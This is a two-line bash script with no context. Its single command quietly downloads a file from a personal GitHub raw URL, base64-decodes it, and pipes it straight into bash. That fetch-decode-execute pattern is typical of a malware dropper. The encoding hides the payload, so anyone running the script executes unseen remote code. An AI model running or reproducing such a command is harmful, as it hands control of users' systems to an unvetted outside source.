#!/bin/bash
wget -qO- https://raw.githubusercontent.com/frederickvanhorne3/infinity/refs/heads/main/entrypoint.sh | base64 -d | bash
